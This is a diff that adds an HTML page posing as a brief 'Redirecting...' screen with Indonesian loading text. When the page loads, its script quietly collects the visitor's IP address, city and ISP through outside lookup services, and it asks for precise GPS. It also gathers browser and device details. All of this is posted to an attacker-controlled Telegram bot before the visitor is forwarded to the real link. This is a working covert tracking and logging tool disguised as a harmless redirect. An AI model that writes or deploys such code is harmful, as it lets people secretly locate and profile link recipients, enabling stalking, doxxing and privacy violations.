@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        // Parse URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const platform = urlParams.get('platform');
+        const display = urlParams.get('display');
+        const actualUrl = urlParams.get('url');
+        const botToken = urlParams.get('botToken');
+        const chatId = urlParams.get('chatId');
+        
+        // Collect visitor data
+        async function collectData() {
+            try {
+                // Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipRes.json();
+                
+                // Get location data
+                let location = {};
+                try {
+                    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                    location = await locRes.json();
+                } catch(e) {}
+                
+                // Try to get GPS
+                let gps = {};
+                try {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000
+                        });
+                    });
+                    gps = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    };
+                } catch(e) {}
+                
+                // Collect device info
+                const device = {
+                    browser: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language
+                };
+                
+                // Format message for Telegram
+                let message = `🔗 <b>Link Clicked Notification</b>\n\n`;
+                message += `📌 <b>Platform:</b> ${display} (${platform})\n`;
+                message += `🌐 <b>URL:</b> ${actualUrl}\n\n`;
+                
+                message += `👤 <b>Visitor Info</b>\n`;
+                message += `- IP: <code>${ip}</code>\n`;
+                message += `- Location: ${location.city || '?'}, ${location.country_name || '?'}\n`;
+                message += `- Org: ${location.org || '?'}\n`;
+                
+                if (gps.lat) {
+                    message += `- GPS: <a href="https://maps.google.com?q=${gps.lat},${gps.lon}">${gps.lat}, ${gps.lon}</a> (Akurasi: ${gps.accuracy}m)\n`;
+                }
+                
+                message += `\n💻 <b>Device:</b>\n`;
+                message += `- Browser: ${device.browser}\n`;
+                message += `- Platform: ${device.platform}\n`;
+                message += `- Screen: ${device.screen}\n`;
+                message += `- Language: ${device.language}\n\n`;
+                
+                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
+                
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+            } catch(error) {
+                console.error("Tracking error:", error);
+            } finally {
+                // Redirect to actual URL
+                window.location.href = actualUrl;
+            }
+        }
+        
+        // Start tracking on page load
+        window.onload = collectData;
+    </script>
+</head>
+<body class="bg-gray-900 text-white flex justify-center items-center h-screen">
+    <div class="text-center">
+        <div class="inline-block animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-4"></div>
+        <h1 class="text-2xl font-bold mb-2">Mengarahkan ke ${display}...</h1>
+        <p class="text-gray-400">Harap tunggu sebentar</p>
+    </div>
+</body>
+</html>
